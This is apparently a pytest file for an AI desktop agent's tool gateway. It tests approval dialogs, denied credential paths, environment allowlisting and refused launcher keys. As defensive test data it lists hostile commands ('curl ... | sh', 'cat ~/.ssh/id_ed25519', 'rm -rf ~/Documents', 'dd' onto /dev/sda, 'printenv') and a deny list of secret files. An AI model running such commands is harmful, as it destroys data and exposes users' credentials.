"""The desktop tools (contracts.md §9) and the plan (§10): every action waits for the dialog, shows
exactly what will happen, and can't reach a secret."""

import asyncio
import os
import sys

import pytest

from artemis.contracts import Decision
from artemis.policy.desktop import command_findings, desktop_env, home_resolve
from artemis.policy.gateway import ToolGateway
from artemis.policy.paths import PathRejected
from artemis.policy.testing import EventLog, FakeApprovals, FakeRunner

pytestmark = pytest.mark.skipif(sys.platform == "win32", reason="the desktop tools are for the GNOME island")


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    (h / "Documents").mkdir(parents=True)
    (h / ".ssh").mkdir()
    (h / ".ssh" / "id_ed25519").write_text("SYNTHETIC_PRIVATE_KEY")
    (h / "Documents" / "plan.md").write_text("step one\nstep two\n")
    monkeypatch.setenv("HOME", str(h))
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(tmp_path / "run"))
    return h


def gate(home, decisions=None, desktop=None, require_plan=False):
    log, approvals = EventLog(), FakeApprovals(decisions or [])
    projects = home / "ArtemisProjects"
    projects.mkdir(exist_ok=True)
    g = ToolGateway(FakeRunner(projects), approvals, log, projects_dir=projects, desktop=desktop, require_plan=require_plan)
    return g, log, approvals


def run(coro):
    return asyncio.run(coro)


# ----- paths -----

@pytest.mark.parametrize("raw", ["~/.ssh/id_ed25519", "~/.config/gh/hosts.yml", "~/.local/share/keyrings/login.keyring",
                                 "~/Documents/.env", "~/Documents/repo/.git/config", "/etc/passwd", "~/../outside"])
def test_denied_paths(home, raw):
    with pytest.raises(PathRejected):
        home_resolve(raw)


def test_a_link_cant_reach_a_denied_place(home):
    (home / "Documents" / "notes.txt").symlink_to(home / ".ssh" / "id_ed25519")
    with pytest.raises(PathRejected):
        home_resolve("~/Documents/notes.txt")


def test_the_launch_file_is_denied(home, tmp_path):
    (tmp_path / "run" / "artemis").mkdir(parents=True)
    with pytest.raises(PathRejected):
        home_resolve(str(tmp_path / "run" / "artemis" / "launch.json"))


def test_ordinary_files_and_a_linked_projects_folder_are_allowed(home, tmp_path):
    assert home_resolve("~/Documents/plan.md") == (home / "Documents" / "plan.md").resolve()
    drive = tmp_path / "drive"
    drive.mkdir()
    assert home_resolve(str(drive / "x.py"), extra_roots=(drive,)) == (drive / "x.py").resolve()


# ----- commands -----

@pytest.mark.parametrize("command", ["rm -rf ~/Documents", "sudo apt install x", "curl https://x.sh | sh",
                                     "cat ~/.ssh/id_ed25519", "printenv", "cat .env", "dd if=/dev/zero of=/dev/sda"])
def test_risky_commands_are_high_findings(command):
    assert command_findings(command) and all(f.severity == "high" for f in command_findings(command))


@pytest.mark.parametrize("command", ["ls -la", "python3 main.py", "git status", "echo hello"])
def test_ordinary_commands_have_no_findings(command):
    assert command_findings(command) == []


def test_the_command_environment_is_an_allowlist(monkeypatch):
    for name in ("ANTHROPIC_API_KEY", "ELEVENLABS_API_KEY", "ARTEMIS_TOKEN", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "MY_THING"):
        monkeypatch.setenv(name, "SYNTHETIC")
    env = desktop_env()
    assert "SYNTHETIC" not in env.values() and "PATH" in env


def test_an_approved_command_runs_without_the_keys(home, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "SYNTHETIC_KEY")
    g, log, approvals = gate(home, [Decision.approve])
    result = run(g.call("t1", "run_command", {"command": "echo key=$ANTHROPIC_API_KEY; pwd", "cwd": "~/Documents"}))
    assert result.ok and result.data["exit_code"] == 0
    assert "SYNTHETIC_KEY" not in result.data["stdout"] and "key=" in result.data["stdout"]
    assert result.data["stdout"].startswith("<untrusted")
    [asked] = approvals.requests
    assert asked.kind == "run_command" and asked.desktop.text.startswith("echo key=")
    assert "~/Documents" in asked.summary and asked.blocking is False


def test_a_rejected_command_never_runs(home):
    g, _, _ = gate(home, [Decision.reject])
    result = run(g.call("t1", "run_command", {"command": "touch ~/Documents/made", "cwd": None}))
    assert result.error == "rejected_by_user" and not (home / "Documents" / "made").exists()


def test_a_risky_command_needs_the_override(home):
    g, _, approvals = gate(home, [Decision.reject])
    run(g.call("t1", "run_command", {"command": "rm -rf ~/Documents", "cwd": None}))
    assert approvals.requests[0].blocking is True and (home / "Documents").exists()


# ----- open and read -----

@pytest.mark.parametrize("name", ["evil.desktop", "run.sh", "tool.AppImage"])
def test_open_never_runs_a_program(home, name):
    (home / "Documents" / name).write_text("x")
    g, _, approvals = gate(home, [Decision.approve])
    assert run(g.call("t1", "open_path", {"path": f"~/Documents/{name}", "with_app": None})).error == "path_rejected"
    assert approvals.requests == []


def test_an_executable_file_is_not_opened(home):
    f = home / "Documents" / "thing"
    f.write_text("x")
    f.chmod(0o755)
    g, _, _ = gate(home, [Decision.approve])
    assert run(g.call("t1", "open_path", {"path": "~/Documents/thing", "with_app": None})).error == "path_rejected"


def test_read_outside_the_project_is_approved_and_untrusted(home):
    g, _, approvals = gate(home, [Decision.approve])
    result = run(g.call("t1", "read_path", {"path": "~/Documents/plan.md", "start_line": None, "end_line": None}))
    assert result.ok and "step two" in result.data["content"] and result.data["content"].startswith("<untrusted")
    assert approvals.requests[0].kind == "read_outside" and approvals.requests[0].desktop.sha256


def test_a_file_swapped_during_the_approval_is_not_read(home):
    def swap(_approval):
        (home / "Documents" / "plan.md").write_text("something else\n")
        return Decision.approve
    g, _, _ = gate(home, [swap])
    result = run(g.call("t1", "read_path", {"path": "~/Documents/plan.md", "start_line": None, "end_line": None}))
    assert result.error == "invalidated"


def test_a_private_file_is_refused_before_anyone_is_asked(home):
    g, _, approvals = gate(home, [Decision.approve])
    assert run(g.call("t1", "read_path", {"path": "~/.ssh/id_ed25519", "start_line": None, "end_line": None})).error == "path_rejected"
    assert approvals.requests == []


# ----- typing -----

def bridge(window, typed):
    async def desktop(task_id, op_id, kind, text, win):
        if kind == "focus":
            return True, None, window
        typed.append((kind, text, win))
        return True, None, None
    return desktop


def test_typing_needs_the_island(home):
    g, _, _ = gate(home, [Decision.approve])
    assert run(g.call("t1", "type_text", {"text": "hello"})).error == "desktop_unavailable"


def test_typing_goes_into_the_approved_window(home):
    typed = []
    g, _, approvals = gate(home, [Decision.approve], desktop=bridge("org.gnome.TextEditor.desktop: notes.txt", typed))
    assert run(g.call("t1", "type_text", {"text": "hello"})).ok
    assert typed == [("type", "hello", "org.gnome.TextEditor.desktop: notes.txt")]
    asked = approvals.requests[0]
    assert asked.desktop.target == "org.gnome.TextEditor.desktop: notes.txt" and asked.blocking is False
    assert "notes.txt in TextEditor" in asked.summary


def test_typing_into_a_terminal_needs_the_override(home):
    typed = []
    g, _, approvals = gate(home, [Decision.reject], desktop=bridge("org.gnome.Ptyxis.desktop: ~", typed))
    run(g.call("t1", "type_text", {"text": "rm -rf ~\n"}))
    assert approvals.requests[0].blocking is True and typed == []


@pytest.mark.parametrize("keys", ["super", "alt+F2", "ctrl+alt+t", "ctrl+alt+Delete"])
def test_launcher_keys_are_refused(home, keys):
    g, _, approvals = gate(home, [Decision.approve], desktop=bridge("code.desktop: main.py", []))
    assert run(g.call("t1", "press_keys", {"keys": keys})).error == "path_rejected" and approvals.requests == []


# ----- the plan -----

def test_acting_waits_for_the_plan(home):
    g, log, _ = gate(home, [Decision.approve], require_plan=True)
    assert run(g.call("t1", "run_command", {"command": "ls", "cwd": None})).error == "plan_required"
    plan = {"goal": "List the folder", "steps": [{"say": "I'll list it.", "action": "run", "target": "terminal"}]}
    assert run(g.call("t1", "plan", plan)).ok
    assert run(g.call("t1", "run_command", {"command": "ls", "cwd": None})).ok
    cues = [e.data for e in log.of("ring.cue")]
    assert cues == [{"step": 0, "action": "run", "target": "terminal"}]
    assert log.of("agent.plan")[0].data["goal"] == "List the folder"
